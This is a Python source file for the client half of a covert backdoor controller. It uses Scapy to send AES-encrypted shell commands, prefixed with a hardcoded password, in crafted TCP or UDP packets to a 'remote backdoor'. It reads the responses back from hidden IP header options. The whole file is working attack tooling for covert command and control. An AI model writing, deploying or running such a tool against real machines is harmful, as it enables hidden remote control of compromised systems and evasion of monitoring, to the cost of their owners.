#!/bin/env python
from __future__ import print_function
from scapy.all import *
import threading
import fcntl
import socket
import struct
import argparse
import netifaces
import os
import ConfigParser

from dcaes import AESCipher


class CommandClient(object):
    def __init__(self, rhost, lhost, sport, dport, protocol, key):
        """
        Initialize the new command client. Grabs the default network card and creates a filter to use for sniffed packets.
        :param rhost: Remote host - The IP address of the remote machine
        :param lhost: Local host - The IP address of this machine
        :param sport: Source port to "listen" for
        :param dport: Destination port
        :param protocol: tcp or udp
        :param key: The key used to encrypt and decrypt commands/responses
        """
        self.password = 'PASSWORD'
        self.lock = threading.RLock()
        self.cond = threading.Condition()
        self.rhost = rhost
        self.lhost = lhost
        self.sport = int(sport)
        self.dport = int(dport)
        self.proto = protocol
        self.key = key

        self.cipher = AESCipher(self.key)

        # get the default hardware interface
        default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        self.hw_addr = netifaces.ifaddresses(default_iface)[netifaces.AF_LINK][0]['addr']

        # create packet filter
        self.filter = self.proto + ' src port ' + str(self.sport) + \
            ' and dst port ' + str(self.dport) + ' and src host ' + self.rhost

    def start(self):
        """
        Starts both the sending and receiving threads and keeps the program alive until a signal
        is received from the user.
        """
        # start the sending thread
        send_thread = threading.Thread(target=self.send_prompt)
        send_thread.setDaemon(True)
        send_thread.start()
        # start the listening thread
        listen_thread = threading.Thread(target=self.listen_incoming)
        listen_thread.setDaemon(True)
        listen_thread.start()

        try:
            while threading.active_count > 0:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print('Closing\n')
            os._exit(0)

    def send_prompt(self):
        """
        Repeatedly prompt the user for commands, and send them to the remote backdoor

        Notes: - Currently, there's no actual prompt because of thread synchronization issues.
                 This will be resolved in the next version.
        :return: None
        """
        while True:
            command = raw_input('')
            load = self.cipher.encrypt_string(self.password + command)
            if self.proto == 'tcp':
                command_packet = IP(dst=self.rhost, src=self.lhost)/TCP(dport=self.dport,
                                                                   sport=self.sport)/Raw(load=load)
            elif self.proto == 'udp':
                command_packet = IP(dst=self.rhost, src=self.lhost)/UDP(dport=self.dport,
                                                                   sport=self.sport)/Raw(load=load)

            send(command_packet, verbose=False)

    # listen for incoming packets
    def listen_incoming(self):
        """
        Just calls Scapy's sniff function and hands packets off to be handled.

        Notes: - There's currently no use for having two separate functions for calling sniff() and handling
                 the sniffed packets, but there may need to be more operations added in future versions. This
                 allows for that.
        :return: None
        """
        sniff(lfilter=self.is_incoming,
              filter=self.filter,
              prn=self.handle_packet)

    def handle_packet(self, packet):
        """
        Handles the packets that have been received from Scapy's sniff function.
        :param packet: The packet received
        :return: None
        """
        if not packet[IP].options:
            return
        print(str(packet[IP].options[0].value), end='')

    def is_incoming(self, pkt):
        """
        lfilter function so that we can tell if datagrams are incoming/outgoing.
        :param pkt: The datagram to test
        :return: True if datagram is incoming, False otherwise
        """
        return pkt[Ether].src != self.hw_addr


def main():
    """
    Main function for the client program. Parses config file and and starts the client.
    :return: None
    """

    # Load config file to parse
    client_config = ConfigParser.ConfigParser()
    client_config.read('client.config')

    # Extract client config settings
    remote_host = client_config.get('Setup', 'remote_host')
    local_host  = client_config.get('Setup', 'local_host')
    sport       = client_config.get('Setup', 'sport')
    dport       = client_config.get('Setup', 'dport')
    protocol    = client_config.get('Setup', 'protocol')
    key         = client_config.get('Setup', 'key')

    #parser = argparse.ArgumentParser()
    #parser.add_argument('-r', '--remote_host', dest='remote_host',
    #                    required=True, help='The IP address of the client')
    #parser.add_argument('-l', '--local_host', dest='local_host',
    #                    required=True, help='The IP address of this machine')
    #parser.add_argument('-s', '--sport', dest='sport', required=True,
    #                   help='Source port')
    #parser.add_argument('-d', '--dport', dest='dport', required=True,
    #                   help='Destination port')
    #parser.add_argument('-p', '--proto', dest='proto', required=True,
    #                    help='The protocol to use: TCP or UDP')
    #parser.add_argument('-k', '--key', dest='key', required=True,
    #                  help='Encryption key required for encrypting and decrypting commands and responses')
    #args = parser.parse_args()

    client = CommandClient(
        remote_host,
        local_host,
        sport,
        dport,
        protocol,
        key)

    client.start()

if __name__ == '__main__':
    main()
